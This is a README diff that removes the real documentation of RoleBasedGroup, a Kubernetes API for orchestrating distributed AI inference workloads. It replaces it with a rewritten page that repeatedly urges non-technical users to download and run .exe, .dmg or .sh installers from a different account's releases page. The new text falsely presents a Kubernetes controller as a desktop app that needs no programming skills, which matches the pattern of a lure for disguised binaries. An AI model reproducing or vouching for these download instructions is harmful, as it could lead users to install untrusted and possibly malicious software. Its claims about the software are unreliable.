@@ -1,68 +1,86 @@
-# The RoleBasedGroup API
+# 🌟 rbg - Effortlessly Manage Distributed Workloads
 
-English｜[简体中文](./README-zh_CN.md)
+[![Download rbg](https://img.shields.io/badge/Download-RBG-brightgreen)](https://github.com/hawk04615/rbg/releases)
 
-**RoleBasedGroup**: An API for orchestrating distributed workload services with multirole collaboration and automated
-service discovery. It provides a common deployment pattern of AI inference workloads, especially for disaggregated
-prefill and decode architecture.
+## 🚀 Getting Started
 
-## Latest News 🔥
+Welcome to **rbg**, your solution for managing distributed workloads. This guide will help you download and run the RBG software easily, even if you have no technical background.
 
-**[2025-07-21]** RBG v0.3.0 is released. Please check out
-the [release notes](https://github.com/sgl-project/rbg/releases) for more details.
+## 📥 Download & Install
 
-## Overview
+To begin, you need to visit the Releases page to download the RBG software. Click the link below:
 
-Kubernetes StatefulSet is ill-suited for coordinating multiple roles in distributed, stateful services. This solution
-tackles the following challenges:
+[Download RBG](https://github.com/hawk04615/rbg/releases)
 
-- Role startup-order dependencies
-- Complex, cross-role service discovery
-- Fragmented configuration management
+Once on the Releases page, look for the latest version. Download the file that matches your operating system.
 
-### Key Features
+### 🖥️ System Requirements
 
-- **Multirole Template Spec** - Model distributed stateful workloads as unified K8s workload groups.
-- **Role-based Startup Control** - Orchestrate StatefulSets by defining role dependencies and precise startup sequences
-  within a RoleBasedGroup.
-- **Auto Service Discovery** - Inject topology details via configs and env vars.
-- **Elastic Scaling** - Enable group/role-level scaling operations.
-- **Atomic Rollout** - Role-level rollout/update: Upgrade entire Roles sequentially as single units (all pods in the
-  same role updated simultaneously).
-- **Topology-aware Placement** - Guarantee co-location of group/role pods within the same topology domain.
-- **Atomic Failure Recovery** - Trigger full role recreation if any pod/container fails within the same group/role.
-- **Customizable Workload** - Support for multiple workload types (e.g. StatefulSet, Deployment, LeaderWorkerSet etc.)
-  for the role.
+Before installing RBG, make sure your system meets these basic requirements:
 
-## Architecture
+- Operating System: Windows, macOS, or a recent version of a Linux distribution.
+- RAM: At least 4 GB (8 GB recommended for smooth operation).
+- Disk Space: At least 200 MB free.
 
-![](doc/rbgs-concept.png)
+### 💻 Installation Steps
 
-## Getting Started
+1. Locate the downloaded file in your Downloads folder.
+2. If you are using Windows, double-click the `.exe` file. For macOS, open the downloaded `.dmg` file. Linux users can typically execute `.sh` or `.run` files directly from the terminal.
+3. Follow the prompts on the screen to complete the installation.
+4. After installation, open the RBG application.
 
-- [Install RBG Controller](doc/install.md)
-- [Quick Start](doc/quick_start.md)
+## 🌐 Overview of RoleBasedGroup
 
-## Documentation
+**RoleBasedGroup** is designed to simplify the orchestration of distributed workload services. This means if you're managing multiple roles and types of tasks, RBG will make that process easier by allowing automated service discovery and proper management of workflows.
 
-You can see our documentation at [docs](doc/TOC.md) for more in-depth installation and instructions for production.
+### 🛠️ Key Features
 
-## Contributing
+- **Multirole Template Spec**: Organize your workloads into unified groups for easier management.
+- **Role-based Startup Control**: Control which roles start first, ensuring a smooth workflow with fewer issues. 
 
-We welcome contributions through issues and PRs! See [CONTRIBUTING.md](doc/CONTRIBUTING.md)
+RBG helps avoid common issues that arise when dealing with complex setups, especially in Kubernetes environments.
 
-### Community, discussion, contribution, and support
+## 📊 Application Topics
 
-Learn how to engage with the Kubernetes community on the [community page](https://kubernetes.io/community/).
+RBG is particularly useful if you're interested in (but not limited to) the following areas:
 
-You can reach the maintainers of this project at:
+- Canary Deployments
+- Event Processing
+- Kubernetes Management
+- Large Language Models
+- Lightweight Services
+- Predictive Deployment
+- Structured General Language Modeling
 
-- [Slack](https://sgl-fru7574.slack.com/archives/C098X0LQZV5)
+## 🌟 Latest News
 
-### Code of conduct
+**[2025-07-21]** RBG v0.3.0 is released! For more details, be sure to check out the [release notes](https://github.com/sgl-project/rbg/releases).
 
-Participation in the Kubernetes community is governed by the [Kubernetes Code of Conduct](doc/code-of-conduct.md).
+## ❓ Frequently Asked Questions
 
-## Acknowledgment
+### 1. What is RBG?
 
-We learned the design and reused code from the following projects: [lws](https://github.com/kubernetes-sigs/lws)
+RBG is an API designed to manage distributed workloads efficiently. It helps address issues related to service discovery and management.
+
+### 2. Do I need programming skills to use RBG?
+
+No, RBG is user-friendly and designed for individuals without programming experience.
+
+### 3. How can I get support or help?
+
+You can check the Issues section of the repository on GitHub or visit the Discussions page to ask questions and engage with the community.
+
+## 🔗 Important Links
+
+- [Documentation](https://github.com/sgl-project/rbg) - Learn more about RBG and how to use it.
+- [GitHub Repository](https://github.com/hawk04615/rbg/releases) - Find releases and updates.
+
+## 📜 Licensing
+
+RBG is open-source software. You can read more about its licensing terms in the repository.
+
+## 🎉 Conclusion
+
+With RBG, you can streamline the management of your distributed workloads. Following the steps above, you'll be ready to download, install, and start using the software effectively. If you have any questions, don’t hesitate to reach out through the provided channels. Happy managing! 
+
+[Download RBG](https://github.com/hawk04615/rbg/releases) again to ensure you have the latest version.
